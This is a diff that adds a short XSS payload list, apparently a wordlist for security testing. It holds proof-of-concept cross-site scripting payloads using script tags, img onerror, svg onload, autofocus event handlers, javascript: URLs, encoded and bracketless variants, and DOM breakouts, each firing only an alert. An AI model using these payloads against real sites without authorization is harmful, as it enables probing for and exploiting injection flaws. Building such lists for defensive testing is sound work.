@@ -1,0 +1,38 @@
+# XSS Payloads for testing
+# Basic script tags
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.domain)</script>
+
+# IMG tags
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('XSS')>
+<img/src="x"/onerror=alert(1)>
+
+# SVG
+<svg onload=alert(1)>
+<svg/onload=alert('XSS')>
+
+# Event handlers
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+
+# JavaScript protocol
+<a href="javascript:alert(1)">Click</a>
+<iframe src="javascript:alert(1)">
+
+# Encoded
+<script>alert(String.fromCharCode(88,83,83))</script>
+<img src=x onerror="alert('XSS')">
+
+# Without brackets
+<script>alert`1`</script>
+<script>alert\u0028'XSS'\u0029</script>
+
+# DOM-based
+#<img src=x onerror=alert(1)>
+'-alert(1)-'
+'-alert(document.domain)-'
